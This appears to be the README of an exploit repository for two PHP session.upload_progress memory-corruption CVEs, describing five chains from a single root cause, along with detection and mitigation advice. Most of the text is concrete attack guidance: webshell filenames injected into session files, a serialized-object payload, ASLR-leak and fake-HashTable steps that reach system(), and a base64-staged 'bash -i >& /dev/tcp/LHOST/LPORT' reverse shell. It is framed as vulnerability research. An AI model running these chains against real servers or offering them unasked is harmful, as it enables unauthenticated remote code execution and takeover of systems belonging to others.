# php2shell

Lab and PoCs for the PHP `session.upload_progress` memory-corruption bugs,
CVE-2026-109618 and CVE-2026-109619. Five exploitation chains from one root cause.
Each phase has its own folder with a self-contained Docker lab and a PoC.

Affected: PHP <= 8.4.26, and the 8.5 line <= 8.5.11. Fixed in 8.2.35, 8.3.36,
8.4.27 and 8.5.12 by commit
[`31c0ea7`](https://github.com/php/php-src/commit/31c0ea7d7ff1d1fccb6492e52dab544011628065)
(GHSA-w8hw-w9fx-j79w / CVE-2026-109618, GHSA-6wmf-4rv5-p3rp / CVE-2026-109619).

## Usage & safety

> **Important - Read this first:**  
> This repository and exploit codes are provided **for educational and research purposes only**. Do **not** use this code against systems, networks, or services for which you do not have **explicit, written authorization**. Unauthorized access to computer systems is illegal and unethical. By using this code you agree to follow applicable laws and institutional policies.

| Phase | Folder | Technique | SAPI | Pre-auth |
|-------|--------|-----------|------|----------|
| A | [A_session_lfi](A_session_lfi/) | upload_progress writes PHP into the session file, included via an LFI | any | yes |
| B | [B_unserialize_uaf](B_unserialize_uaf/) | var_destroy UAF overwrites a function handler with `zif_system` | any | no (escalation) |
| C | [C_handler_mismatch](C_handler_mismatch/) | serialize_handler mismatch deserializes an object, `__destruct` fires | FPM | yes |
| D | [D_oom_mod_php](D_oom_mod_php/) | OOM leaks ASLR over HTTP, fake HashTable destructor runs `system` | mod_php | yes |
| E | [E_fpm_stale_bg](E_fpm_stale_bg/) | FPM session-decode OOM leaves a stale global, reused next request | FPM | consumer yes, producer needs a seeded session |

## The two bugs

Both are about what PHP does when an allocation exceeds `memory_limit`. `emalloc`
failure calls `zend_bailout()`, which `longjmp`s to the request boundary and skips
every cleanup step in between:

```c
// Zend/zend_alloc.c:401
static ZEND_COLD ZEND_NORETURN void zend_mm_safe_error(zend_mm_heap *heap,
    const char *format, size_t limit, ... size_t size)
{
    heap->overflow = 1;
    zend_try {
        zend_error_noreturn(E_ERROR, format, limit, size);  // "Allowed memory size ... exhausted"
    } zend_catch {
    } zend_end_try();
    heap->overflow = 0;
    zend_bailout();        // longjmp back to the request boundary
    exit(1);
}
```

- **CVE-2026-109618 (OOM corruption):** an allocation failing mid-build leaves
  half-initialized structs and freed-but-referenced pointers. A use-after-free
  inside one request.
- **CVE-2026-109619 (stale global):** the jump can skip a per-request global's
  reset. On a persistent worker (PHP-FPM, Apache prefork mod_php) the dirty global
  survives into the next request, which reuses it and follows the previous,
  freed request's pointers.

The 8.5.12 fix ("Avoid state corruption via bailout", commit `31c0ea7`) replaces
the OOM bailout with a soft unwind and resets the startup globals. Allocations
become fallible and are checked, so the decode exits through normal cleanup
instead of a `longjmp`:

```c
// ext/standard/var_unserializer.re (8.5.12)
zend_string *str = zend_string_falloc(len, 0, /* fallible */ true);
if (UNEXPECTED(!str)) return NULL;     // clean failure
...
if (ZEND_HAS_OOM()) goto failure;      // unwind through normal cleanup
```

## Entry point: session.upload_progress

On by default. A multipart POST with a `PHP_SESSION_UPLOAD_PROGRESS` field makes
PHP write an upload-progress record into the session file during request startup,
before application code runs. No auth. The record keeps the uploaded filename
verbatim (attacker bytes in a file PHP later deserializes, phases A and C), and
writing it runs `session_start()` -> `php_var_unserialize()`, the OOM-corruptible
path (phases D and E). `session.use_strict_mode` defaults to 0, so you choose the
session id.

## The fire gadget

The memory chains end at a 167-byte buffer shaped as a HashTable with one element
and `pDestructor` set to `zif_system`. `zend_array_destroy` compares the destructor
to the default and, when it differs, dispatches to the per-element path:

```c
// Zend/zend_hash.c:1826  inside zend_array_destroy
if (UNEXPECTED(ht->pDestructor != ZVAL_PTR_DTOR)) {
    zend_hash_destroy(ht);        // non-default destructor -> this path
    goto free_ht;
}
// zend_hash_destroy then runs, per element:  ht->pDestructor(&p->val)  (= zif_system)
```

The bucket is laid out to act as a call frame with one string argument, so the
call is `system("<cmd>")`. Build-specific inputs: the `zif_system` and
`zval_ptr_dtor` offsets (read from the binary) plus one heap landing offset
(brute-forced over HTTP).

## Phase A: upload_progress -> LFI

Requires an LFI sink. No memory corruption, any SAPI, any affected version. The
upload filename is stored into the session verbatim:

```c
// ext/session/session.c:3308  (MULTIPART_EVENT_FILE_START)
php_rinit_session(0);
PS(id) = zend_string_init(Z_STRVAL(progress->sid), Z_STRLEN(progress->sid), 0);  // your SID
...
// :3322
add_assoc_string_ex(&progress->current_file, "name", sizeof("name") - 1, *data->filename);  // raw filename
```

Set the filename to `<?php system($_GET[0]); ?>`, so it lands in `/tmp/sess_<SID>`,
then include that file through the LFI sink. Default
`session.upload_progress.cleanup=1` deletes the record when the body finishes, so
send a stalled upload (large `Content-Length`, body withheld) and fire the LFI
while it is open.

## Phase B: var_destroy UAF -> handler overwrite

Requires reaching `unserialize()` plus a memory read/write primitive. Escalation
step; bypasses `disable_functions`. The unserializer parks each built value in
`var_push`, and the OOM frees that node while it is still referenced:

```c
// ext/standard/var_unserializer.re:116
static inline void var_push(php_unserialize_data_t *var_hashx, zval *rval)
{
    var_entries *var_hash = (*var_hashx)->last;        // dangling / reoccupied node
    ...
    var_hash->data[var_hash->used_slots++] = rval;     // write into controlled memory
}
```

The PoC uses `/proc/self/mem`: find the function table, read `system`'s handler
(`zif_system`), overwrite `var_dump`'s handler with it, then call `var_dump()` so
dispatch hits `system()`. Dispatch reaches the binary's real `zif_system`, so
`disable_functions` does not apply. Offsets are resolved at runtime.

## Phase C: serialize_handler mismatch -> __destruct

Requires PHP-FPM, one path writing sessions as `php_serialize` and another reading
them as the default `php` handler, and a class with a usable `__destruct`. The
serializers disagree on `|`:

```c
// ext/session/session.c:1107  PS_SERIALIZER_DECODE_FUNC(php)
while (p < endptr) {
    q = p;
    while (*q != PS_DELIMITER) {            // PS_DELIMITER == '|'
        if (++q >= endptr) { retval = FAILURE; goto break_outer_loop; }
    }
    ...
    current = var_tmp_var(&var_hash);
    if (php_var_unserialize(current, &q, endptr, &var_hash)) {   // builds O:4:"Evil":...
        ...
    } else {
        retval = FAILURE; goto break_outer_loop;                 // too late, object exists
    }
}
break_outer_loop:
    PHP_VAR_UNSERIALIZE_DESTROY(var_hash);   // destroys it -> __destruct fires
```

Inject a filename of `x|O:4:"Evil":1:{s:3:"cmd";s:2:"id";}` via upload_progress
(written as `php_serialize`). The `php`-handler reader splits at the first `|`,
unserializes the right side into an object, reports failure on the trailing bytes,
and destroys the object in cleanup, firing `__destruct`. Needs the same stalled
upload as A (cleanup is on by default). Swap `Evil` for a framework POP chain on a
real target.

## Phase D: OOM -> ASLR leak + fake HashTable

No application conditions. Unauthenticated RCE on stock `php:8.4.26-apache`.

1. **Saturate:** hold `MaxRequestWorkers - 1` workers with slow chunked uploads so
   the producer and consumer hit the one free worker (the producer's OOM closes
   its connection, so the pair can't be pinned otherwise).
2. **Leak:** a chunked multipart body (past `post_max_size`) sized so Zend-MM hits
   `memory_limit` at the session-cookie URL-encode:

   ```c
   // ext/session/session.c:1447  (size the body so this allocation fails)
   e_id = php_url_encode(ZSTR_VAL(PS(id)), ZSTR_LEN(PS(id)));
   ```

   The request bails with `PS(send_cookie)` set and `PS(id)` dangling. A second
   request reoccupies the chunk with a forged `zend_string` (600 KB length window),
   so `Set-Cookie` returns that much heap. The dump gives the Zend-MM chunk base
   (pointers on a 2 MB boundary) and the libphp base (pointer matching
   `zval_ptr_dtor`'s page offset).
3. **Fire:** the same OOM left `PS(http_session_vars)` dangling. Spray the fake
   HashTable to reoccupy it; at request end `zend_array_destroy` calls the forged
   destructor. Verified end to end, ASLR on, single worker and the default
   150-worker pool.

**Reverse shell.** The fire runs one `system()` whose command lives in a fixed
slot in the sprayed table, capped at ~14 bytes (measured: 14 fires, 16 lands in
the wrong bin), too small for a shell payload. So the payload goes through a
session instead. Phase A's write primitive (`upload_progress`) stages the shell
into a new session file:

```php
// written into /tmp/sess_0 via the uploaded filename; base64 so no quotes
// break the multipart header. B64 decodes to:
//   bash -c 'bash -i >& /dev/tcp/LHOST/LPORT 0>&1'
<?php system(base64_decode('B64'));?>
```

The upload is held open so the default `cleanup=On` doesn't wipe the record, and
the 14-byte fire runs:

```
php /tmp/s*
```

which is 11 bytes (the glob keeps the path under the limit), matches `sess_0`, and
makes PHP execute the embedded `<?php ... ?>` while echoing the surrounding
serialized bytes as harmless text. That runs the reverse shell. The staged
session holds one worker, so saturation drops to `blockers - 1` to keep one free
for the fire. Caught `uid=33(www-data)` this way.

The code in that folder is from dinosn's `stock_aslr.py` (see Credits). The worker
saturation was taken from it.

## Phase E: FPM stale BG UAF

Requires PHP-FPM and a shared worker. Produces a cross-request use-after-free and
an unauthenticated ASLR leak; the destructor fire does not complete on stock FPM.

**Pre-auth:** the consumer (the upload_progress request reusing the stale global)
is unauthenticated, but the producer is not on its own. A stale `BG(unserialize)`
needs `session_start()` to OOM while decoding a session file, i.e. a
gadget-plus-bomb session already on disk. An unauthenticated attacker can't write
that into a bare app (session writes are app-controlled; upload_progress stores
only bounded strings). The lab plants it with `plant_e.php` (local write). Pre-auth
routes: chain phase C as the session-write, or grow the session with `cleanup=Off`
upload_progress accumulation until a later decode OOMs (flaky).

The decode reuses a global that the OOM leaves dirty:

```c
// ext/standard/var_unserializer.re:60
PHPAPI php_unserialize_data_t php_var_unserialize_init(void) {
    if (BG(serialize_lock) || !BG(unserialize).level) {
        d = emalloc(sizeof(struct php_unserialize_data));
        ...
        BG(unserialize).data  = d;
        BG(unserialize).level = 1;
    } else {
        d = BG(unserialize).data;     // reuse whatever is still there
        ++BG(unserialize).level;
    }
    return d;
}
// :84
PHPAPI void php_var_unserialize_destroy(php_unserialize_data_t d) {
    if (BG(serialize_lock) || BG(unserialize).level == 1) {
        var_destroy(&d);
        efree(d);
    }
    if (!BG(serialize_lock) && !--BG(unserialize).level) {
        BG(unserialize).data = NULL;
    }
}
```

A session holds a gadget object then a large string. `session_start()` builds the
object, OOMs on the string, and the `longjmp` leaves `php_unserialize_data`
pointing at freed `var_entries`. The next request reloads the stale struct and
dereferences a dangling pointer (502). With a long multipart boundary and binary
field values in the freed region, the faulting pointer is controlled and the path
reaches a write of `[controlled + index*8 + 0x10]`.

Leak (no `/proc`): that write drops a `.rodata` pointer (`base + 0x817328`) into a
`$_SESSION` integer field; FPM reflects a PHP integer as a decimal in JSON, so a
progress endpoint returns it. `base = value - 0x817328`, then
`zif_system = base + 0x30a0f0`, the rest from the on-disk `.dynsym`.

The fire does not complete on stock FPM: the stale `var_destroy` never runs (the
clean OOM leaves `BG(unserialize).level` at 1, the consumer's init/destroy balance
1->2->1, so the `var_destroy` branch is never taken), and phase D's producer can't
be reproduced because `PS(http_session_vars)` teardown is atomic (`zval_ptr_dtor`
then `ZVAL_UNDEF`, nothing allocating between, and `zend_array_destroy` allocates
nothing). It reopens only if `$_SESSION` can hold an object with an allocating
`__destruct`, or if the session is planted via phase C.

## nginx and PHP-FPM

nginx's 2026 memory CVEs (e.g. CVE-2026-42533, fixed 1.31.3) are closed in current
mainline (1.31.7). In a `location ~ \.php$` + `fastcgi_pass` setup nginx is the
FastCGI client and builds every record length itself, so the protocol-parser bugs
and the CVE-2019-11043 PATH_INFO family are out of reach. The realistic FPM win is
config, not corruption: `cgi.fix_pathinfo=1` with no `try_files $uri =404;` and a
writable web root turns any file-write or LFI into RCE via `GET /uploaded/x.php`.
The native corruption chains are strongest on mod_php.

## Detection and mitigation

Patch to 8.2.35 / 8.3.36 / 8.4.27 / 8.5.12 or later. Otherwise:
`session.upload_progress.enabled = Off` removes the entry point for A, C, D, E;
`session.use_strict_mode = 1` blocks the session-id fixation; keep
`session.save_path` off the web root and no user input in `include`/`require`.
Watch for: `PHP_SESSION_UPLOAD_PROGRESS` multipart with a filename holding `<?php`
or `|O:`; an `Allowed memory size ... exhausted` followed by a same-worker 500/502;
oversized `Set-Cookie: PHPSESSID=` responses; bursts of chunked uploads that never
finish.

## Credits

- 9bie,
  [github.com/9bie/php2shell-bypass-aslr-exp](https://github.com/9bie/php2shell-bypass-aslr-exp)
  - the mod_php OOM -> Set-Cookie ASLR leak -> fake-destructor chain. A lot of the
  memory-corruption research behind phase D draws on this repo.
- dinosn (Nicolas Krassas),
  [github.com/dinosn/php-cve-2026-10961x-lab-poc](https://github.com/dinosn/php-cve-2026-10961x-lab-poc)
  - phase D's driver (`engine.py` / `php2shell.py`), including the worker-pool
  saturation.
- ikow (Qi Deng),
  [github.com/ikow/php2shell-poc](https://github.com/ikow/php2shell-poc)
  - phases A, B and C.
